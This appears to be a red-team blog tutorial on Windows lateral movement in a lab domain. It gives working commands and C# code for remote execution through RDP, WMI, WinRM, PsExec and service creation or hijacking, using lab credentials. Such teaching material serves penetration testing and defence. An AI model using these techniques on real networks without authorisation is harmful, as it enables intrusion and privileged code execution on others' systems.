---
title: "Lateral Movement 101"
date: 2021-10-12T09:25:13+01:00
authors:
    - RastaMouse
draft: false
---

This post was requested by a [Patron](https://www.patreon.com/_RastaMouse) and will provide a crash course in lateral movement techniques on Windows using both native utilities and custom C# tooling.  

The most common lateral movement techniques are performed via legitimate management channels including Remote Desktop (RDP), Windows Remote Management (WinRM) and Windows Management Instrumentation (WMI).  Platforms such as Windows Server Update Services (WSUS) and System Center Configuration Manager (SCCM) can also be abused.

These management protocols are effective because they provide legitimate remote access by design, and their use is not inherently mallicious or anomalous.  All an attacker need obtain is a set of privileged credentials or code execution in a privileged context.

## Remote Desktop

I think everyone has probably used RDP before.  It allows you to get a full GUI experience of a remote machine as if you were sat at it, optionally supporting clipboard sharing and remote drive mapping.  Attackers often operate via CLI driven tooling (e.g. Metasploit) and sometimes over high-latency connections.  For that reason, interacting with a remote target via a GUI is not always feasible (or enjoyable) which leads to a general preference for CLI attack tools.

[SharpRDP](https://github.com/0xthirteen/SharpRDP) utilises the terminal services library to provide GUI-less authentication and interaction (by sending virtual keystrokes into the "Run" (Win+R) dialogue).

```text
PS C:\> Test-NetConnection -ComputerName dc -Port 3389

ComputerName     : dc
RemoteAddress    : 10.10.120.1
RemotePort       : 3389
InterfaceAlias   : Ethernet
SourceAddress    : 10.10.120.101
TcpTestSucceeded : True

PS C:\> .\SharpRDP.exe computername=dc command=calc username=LAB\Administrator password=Passw0rd!
[+] Connected to          :  dc.lab.local
[+] Execution priv type   :  non-elevated
[+] Executing calc
[+] Disconnecting from    :  dc.lab.local
[+] Connection closed     :  dc.lab.local
```

<br />

## Windows Management Instrumentation

WMI is Microsoft's implementation of Web-Based Enterprise Management (WBEM), which is an industry standard for accessing management information of local or remote computers.  Applications that leverage WMI can get data or perform operations on said computers.

Windows comes with a native `wmic` utility that can be used to execute commands on a target.

```text
C:\>wmic /NODE:dc.lab.local /USER:Administrator /PASSWORD:Passw0rd! process call create calc
Executing (Win32_Process)->Create()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
{
        ProcessId = 6548;
        ReturnValue = 0;
};
```

C# has a namespace called `System.Management` which can be used to perform the same.

```c#
private static void Main(string[] args)
{
    var target = args[0];
    var username = args[1];
    var password = args[2];
    var command = args[3];

    var conn = new ConnectionOptions
    {
        Username = username,
        Password = password
    };

    var scope = new ManagementScope($@"\\{target}\root\cimv2", conn);
    scope.Connect();
            
    var mClass = new ManagementClass(scope, new ManagementPath("Win32_Process"), new ObjectGetOptions());
    var parameters = mClass.GetMethodParameters("Create");
    parameters["CommandLine"] = command;

    var result = mClass.InvokeMethod("Create", parameters, null);

    Console.WriteLine("Return Value: {0}", result["ReturnValue"]);
    Console.WriteLine("Process ID  : {0}", result["ProcessID"]);
    }
}
```

```text
C:\>WmiDemo.exe dc.lab.local Administrator Passw0rd! calc
Return Value: 0
Process ID  : 6304
```

<br />

## Windows Remote Management

PowerShell can be used to interact with a host via WinRM.  `Enter-PSSession` creates a PowerShell session on the target and gives you an interactive command prompt.

```powershell
PS C:\> $username = "LAB\Administrator"
PS C:\> $password = ConvertTo-SecureString "Passw0rd!" -AsPlainText -Force
PS C:\> $cred = New-Object System.Management.Automation.PSCredential($username, $password)
PS C:\> Enter-PSSession -ComputerName dc.lab.local -Credential $cred
[dc.lab.local]: PS C:\Users\Administrator\Documents> hostname
dc
[dc.lab.local]: PS C:\Users\Administrator\Documents> whoami
lab\administrator
```

If you don't have an interactive prompt, `Invoke-Command` with `-ScriptBlock` can be used instead.

```powershell
PS C:\> Invoke-Command -ComputerName dc.lab.local -Credential $cred -ScriptBlock { hostname; whoami }
dc
lab\administrator
```

C# tooling requires a reference to `System.Management.Automation.dll` which is available from the PowerShell SDK.  Or if you're lazy like me, grab a copy from Lee Christenden's [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell/blob/master/PowerShellRunner/System.Management.Automation.dll) project.

```c#
private static void Main(string[] args)
{
    var target = args[0];
    var username = args[1];
    var password = args[2];
    var command = args[3];

    var securePass = new SecureString();

    foreach (var c in password.ToCharArray())
        securePass.AppendChar(c);

    var credential = new PSCredential(username, securePass);
    var uri = new Uri($"http://{target}:5985/WSMAN");
    var conn = new WSManConnectionInfo(uri, string.Empty, credential);

    using var runspace = RunspaceFactory.CreateRunspace(conn);
    runspace.Open();

    using var powershell = PowerShell.Create();
    powershell.Runspace = runspace;
    powershell.AddScript(command);
    powershell.AddCommand("Out-String");

    var result = powershell.Invoke();
    var output = string.Join(Environment.NewLine, result.Select(r => r.ToString()).ToArray());
            
    Console.WriteLine(output);
}
```

```text
C:\>WinRMDemo.exe dc.lab.local LAB\Administrator Passw0rd! "hostname; whoami"
dc
lab\administrator
```

<br />

## PsExec

PsExec is the name of a tool from [Sysinternals](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec).

```text
C:\>PsExec64.exe \\dc.lab.local -u LAB\Administrator -p Passw0rd! -i cmd

PsExec v2.34 - Execute processes remotely
Copyright (C) 2001-2021 Mark Russinovich
Sysinternals - www.sysinternals.com

Microsoft Windows [Version 10.0.20348.1]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>hostname && whoami
dc
rto2\administrator
```

This works by copying `PSEXESVC.exe` to the target, then creating a new service to execute it.  This binary in turn spawns the specified process (cmd in this case), attaches to its standard in/out and sends data back and forth over named pipes.  To clean up, the service is then removed and `PSEXESVC.exe` deleted.

Interacting with the SCM is easy to replicate using the native `sc.exe` utility or in code.  The backend API `OpenSCManager` does not accept credentials, so all calls must occur within an authenticated session.

```text
C:\>runas /netonly /user:LAB\Administrator cmd.exe
Enter the password for LAB\Administrator:
Attempting to start cmd.exe as user "LAB\Administrator" ...

C:\Windows\system32>sc \\dc.lab.local create TestService binPath= "C:\Windows\System32\calc.exe"
[SC] CreateService SUCCESS

C:\Windows\system32>sc \\dc.lab.local start TestService
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.

C:\Windows\system32>sc \\dc.lab.local delete TestService
[SC] DeleteService SUCCESS
```

Even though `start` threw an error, the command was executed and calc is running as SYSTEM.  Service binaries should technically be different from regular binaries, as they contain means of communicating directly with the SCM for status purposes.

Instead of creating a service (which is often used as an IOC), we can modify an existing one instead.  Connect to the SCM of a remote machine and enumerate services to find those with a startup type of Manual.  Change its `binPath` to whatever you want to exectute, start the service and then change the path back.